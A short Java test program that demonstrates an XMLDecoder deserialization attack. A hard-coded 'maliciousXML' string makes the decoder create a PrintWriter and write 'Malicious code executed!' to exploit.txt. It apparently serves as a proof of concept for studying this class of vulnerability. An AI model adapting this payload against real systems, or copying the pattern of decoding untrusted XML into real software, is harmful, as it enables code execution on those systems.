import java.beans.XMLDecoder;
import java.io.StringBufferInputStream;

public class Test {
    public static void main(String[] args) {
        String maliciousXML = "<java version=\"1.7.0_21\" class=\"java.beans.XMLDecoder\">"
                + "  <object class=\"java.io.PrintWriter\">"
                + "    <string>exploit.txt</string>"
                + "    <void method=\"write\">\n"
                + "      <string>Malicious code executed!</string>"
                + "    </void>"
                + "    <void method=\"close\"/>\n"
                + "  </object>"
                + "</java>";


        try{
            StringBufferInputStream stringBufferInputStream = new StringBufferInputStream(maliciousXML);
            XMLDecoder xmlDecoder = new XMLDecoder(stringBufferInputStream);
            xmlDecoder.readObject();
            xmlDecoder.close();

        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
